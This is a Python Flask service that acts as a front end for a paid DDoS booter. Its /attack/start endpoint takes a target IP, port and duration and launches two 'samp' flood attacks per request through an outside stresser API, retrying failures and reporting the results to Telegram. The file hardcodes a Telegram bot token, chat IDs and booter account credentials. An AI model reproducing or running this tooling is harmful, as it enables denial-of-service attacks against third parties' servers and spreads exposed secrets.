# -*- coding: utf-8 -*-
from flask import Flask, request, jsonify
import requests
import logging
import time
import threading

app = Flask(__name__)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Telegram Configuration
BOT_TOKEN = "6982857776:AAFDG6KtTz4T6jYjeZiwFdqZgTpqSW8Mj3Y"
CHAT_IDS = ["8523310365", "7646520243"]
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

def send_telegram_message(message):
    for chat_id in CHAT_IDS:
        if chat_id:
            try:
                requests.post(TELEGRAM_API_URL, data={'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML'}, timeout=5)
            except:
                pass

# ==================== OLD APIS ONLY ====================
TARGET_APIS = [
    {"id": 1, "name": "OLD_API_1", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
    {"id": 2, "name": "OLD_API_2", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
    {"id": 3, "name": "OLD_API_3", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
    {"id": 4, "name": "OLD_API_4", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
    {"id": 5, "name": "OLD_API_5", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
]

def is_api_available(api):
    if api['busy'] and time.time() < api.get('busy_until', 0):
        return False
    return True

def mark_busy(api, duration):
    api['busy'] = True
    api['busy_until'] = time.time() + (duration * 2) + 15   # 2x duration + buffer

def mark_free(api):
    api['busy'] = False
    api['busy_until'] = 0

def get_response_summary(response, response_time):
    summary = f"Status: {response.status_code} | Time: {response_time}ms\n"
    try:
        json_data = response.json()
        summary += f"JSON: {json_data}"
    except:
        text = response.text.strip()
        if len(text) > 700:
            text = text[:700] + "... [truncated]"
        summary += f"Response: {text}"
    return summary

def is_attack_successful(response):
    if not response:
        return False
    try:
        data = response.json()
        error = data.get('error')
        message = str(data.get('message', '')).lower()
        if error is False or any(word in message for word in ['launched', 'success', 'started', 'sent', 'attack']):
            return True
        if error is True or any(word in message for word in ['slots full', 'busy', 'full', 'wait', 'limit', 'cooldown', 'fail']):
            return False
    except:
        pass
    return response.status_code == 200

def send_single_attack(api, ip, port, duration, attack_number):
    """Send one attack with retry"""
    method = "samp"
    max_retries = 8
    retry_count = 0

    while retry_count < max_retries:
        attempt = retry_count + 1
        start_time = time.time()
        
        try:
            target_url = api['url'].format(method=method, ip=ip, port=port, time=duration)

            response = requests.get(target_url, timeout=25)
            response_time = int((time.time() - start_time) * 1000)
            
            send_telegram_message(f"""
🔵 <b>ATTACK {attack_number}/2 - ATTEMPT #{attempt}/{max_retries}</b> | {api['name']}
├ Method: SAMP
├ Target: {ip}:{port}
├ Duration: {duration}s
├ Status: {response.status_code}
└ Response:
{get_response_summary(response, response_time)}
""")

            if is_attack_successful(response):
                send_telegram_message(f"""
✅ <b>ATTACK {attack_number}/2 STARTED</b> | {api['name']}
├ Target: {ip}:{port} | Duration: {duration}s
""")
                return True

            retry_count += 1
            if retry_count < max_retries:
                time.sleep(2)

        except Exception as e:
            retry_count += 1
            send_telegram_message(f"⚠️ Error on {api['name']} (Attack {attack_number}, Attempt {attempt}): {str(e)[:150]}")
            if retry_count < max_retries:
                time.sleep(min(2 ** retry_count, 10))

    send_telegram_message(f"💀 Attack {attack_number}/2 failed on {api['name']}")
    return False

def execute_attack(api, ip, port, total_time):
    mark_busy(api, total_time)
    send_telegram_message(f"🚀 STARTING 2x ATTACK on {api['name']} → {ip}:{port} ({total_time}s each)")

    # Send attack 1
    send_single_attack(api, ip, port, total_time, 1)
    
    # Small delay between two attacks
    time.sleep(3)
    
    # Send attack 2
    send_single_attack(api, ip, port, total_time, 2)

    # Wait full duration (2x attack)
    send_telegram_message(f"⏳ Waiting full duration for {api['name']}...")
    time.sleep(total_time * 2)

    mark_free(api)
    send_telegram_message(f"✅ SLOT RELEASED → {api['name']} is now available")

@app.route('/attack/start', methods=['GET'])
def start_attack():
    ip = request.args.get('ip')
    port = request.args.get('port')
    time_param = request.args.get('time')
    packet_len = request.args.get('len', 512)  # Not used but kept for compatibility

    if not all([ip, port, time_param]):
        return jsonify({'error': 'Missing ip, port or time'}), 400

    try:
        port = int(port)
        total_time = int(time_param)
        if total_time <= 0 or total_time > 1800:   # Max 30 minutes
            raise ValueError
    except:
        return jsonify({'error': 'Invalid parameters'}), 400

    # Find first available Old API
    available_api = next((api for api in TARGET_APIS if is_api_available(api)), None)

    if not available_api:
        return jsonify({'error': 'All Old APIs are busy'}), 503

    threading.Thread(
        target=execute_attack,
        args=(available_api, ip, port, total_time),
        daemon=True
    ).start()

    return jsonify({
        'success': True,
        'api': available_api['name'],
        'target': f'{ip}:{port}',
        'attacks': 2,
        'duration_each': total_time
    })

@app.route('/status', methods=['GET'])
def status():
    return jsonify({
        'free': [api['name'] for api in TARGET_APIS if is_api_available(api)],
        'busy': [api['name'] for api in TARGET_APIS if api['busy']]
    })

if __name__ == '__main__':
    print("="*90)
    print("🚀 OLD APIS ONLY - 2 ATTACKS PER REQUEST")
    print("Each attack request = 2x SAMP attack on same API")
    print("Usage: /attack/start?ip=1.2.3.4&port=80&time=300")
    print("="*90)
    app.run(host='0.0.0.0', port=8080, threaded=True)
